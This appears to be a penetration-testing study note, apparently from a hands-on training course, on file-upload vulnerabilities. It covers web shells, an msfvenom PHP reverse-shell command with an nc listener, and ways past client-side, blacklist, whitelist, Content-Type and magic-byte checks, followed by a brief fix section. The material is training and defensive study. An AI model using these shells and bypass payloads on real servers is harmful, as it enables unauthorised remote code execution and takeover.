# File Upload Attacks

> Status: 🟨 In progress (sections 1–5 of 11 built)
> Date started: 2026-10-26
> Date finished: 2026-10-27
## 1. Goal
Abuse a file-upload feature to get code execution (upload a web shell / reverse shell) or other impact by defeating the upload validation. File-upload bugs are mostly rated **High/Critical** (CWE-434); the worst is an **unauthenticated arbitrary file upload**. The whole game is **bypassing the validation**.

## Identify the web framework (pick the right shell)
A web shell must be in the server's language, so first find what runs the app:
- URL/page extension (`.php`, `.asp`, `.aspx`) — but routes can hide it.
- Visit `/index.ext` swapping `ext` (php/asp/aspx…) — same page back = that language. Fuzz with Burp Intruder + a web-extensions wordlist.
- **Wappalyzer** extension (lang + server + OS + libs), or Burp/ZAP scanners.

## Absent validation (arbitrary upload)
No filter at all → upload a script directly. Confirm code execution first with a harmless test:
```php
<?php echo "Hello HTB"; ?>        // upload test.php → visit /uploads/test.php
// renders "Hello HTB" = PHP executes; shows source = it doesn't
```

## Upload exploitation — shells
**Web shells** (interactive in-browser):
```php
<?php system($_REQUEST['cmd']); ?>     // shell.php → /uploads/shell.php?cmd=id  (view-source Ctrl+U for clean output)
<% eval request('cmd') %>              // .NET/ASP equivalent → ?cmd=id
```
Ready-made: **phpbash** (terminal-like PHP web shell), SecLists `/opt/useful/seclists/Web-Shells/`. If `system()` is disabled or a WAF blocks it, try another shell / advanced bypass.

**Reverse shells** (preferred — more interactive):
```bash
# pentestmonkey php-reverse-shell.php → edit $ip/$port (lines 49-50), start listener, upload, visit:
nc -lvnp <PORT>
# or generate one:
msfvenom -p php/reverse_php LHOST=<IP> LPORT=<PORT> -f raw > reverse.php
```
Reverse shells can fail (egress firewall, disabled functions) → fall back to a web shell.

## Bypassing validation
- **Client-side only** (JS checks extension, no HTTP request on select): two ways —
  1. **Burp**: capture the real `POST /upload.php`, change `filename="HTB.png"` → `shell.php` and the body to your shell, forward.
  2. **Disable the JS**: Page Inspector (`Ctrl+Shift+C`) → find `onchange="checkFile(this)"` on the `<input type=file>` → delete the `checkFile` call (and the `accept=".jpg,..."` attr). Temporary (client-side only), but enough to upload.
  Find the uploaded path via the inspector (`<img src="/profile_images/shell.php">`).
- **Blacklist** (blocks `.php`): fuzz extensions (Burp Intruder, PayloadsAllTheThings/SecLists web-extensions, un-tick URL-encode on the `.`) → use an allowed executable one: `.phtml`, `.php5`, `.php7`, `.phar`, `.pHp`/mixed-case (Windows = case-insensitive filenames). Example vuln code checks `pathinfo($name, PATHINFO_EXTENSION)` against `array('php','php7','phps')` — not comprehensive, and case-sensitive.
- **Whitelist** (`.jpg` only): double extension `shell.jpg.php`, reverse `shell.php.jpg` (Apache misconfig), or char injection around the ext (`shell.php%00.jpg` old PHP, `%20`, `%0a`, trailing `.`/`/`).
- **Content-Type / MIME**: set `Content-Type: image/png` on the request even though the body is PHP.
- **Magic bytes**: prepend a real file signature (e.g. `GIF8`/`GIF89a;`) so content-sniffing passes; PHP after it still runs.

## Even "limited" uploads have impact
| If only these allowed | Attack |
|---|---|
| HTML / JS / SVG / GIF | stored **XSS** |
| XML / SVG / PDF / DOCX | **XXE / SSRF** |
| ZIP / JPG / PNG | **DoS** (zip bomb / pixel flood) |
| any (path not checked) | path traversal to overwrite files |

## Fix
Whitelist by extension **and** validate content/magic bytes; store uploads outside the webroot or on a non-exec path; randomize filenames; serve with a safe Content-Type; never trust client-side checks.

> Order of bypass attempts: client-side → blacklist (alt extension) → whitelist (double/reverse ext, char injection) → content-type → magic bytes. SVG is the sleeper — "image" upload that's really XML → XSS and XXE.
